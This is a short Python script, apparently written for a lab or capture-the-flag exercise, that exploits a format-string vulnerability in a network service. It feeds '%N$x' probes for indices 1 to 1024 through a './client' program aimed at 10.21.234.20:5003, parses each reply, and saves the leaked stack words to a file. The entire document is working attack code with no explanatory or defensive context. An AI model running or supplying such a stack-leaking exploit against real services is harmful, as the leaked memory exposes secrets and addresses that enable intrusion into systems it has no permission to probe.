import subprocess 
import os 
  
def executeClient(n): 
  
    # create a pipe to a child process 
    data, temp = os.pipe() 
  
    # write to STDIN as a byte object(covert string 
    # to bytes with encoding utf8) 
    os.write(temp, bytes("%" + str(n) + "$x\n", "utf-8")); 
    os.close(temp) 
  
    # store output of the program as a byte string in s 
    s = subprocess.check_output("./client 10.21.234.20 5003", stdin = data, shell = True) 
  
    # decode s to a normal string 
    ret = s.decode("utf-8")[28:]
    ret = ret.split()[0]

    os.close(data)

    return ret 
  
  
# Driver function 
if __name__=="__main__":

    with open("stackcontents", "w") as f:
        for i in range(1,1025):
            ret = executeClient(i)
            f.write(ret + "\n")
            print(ret)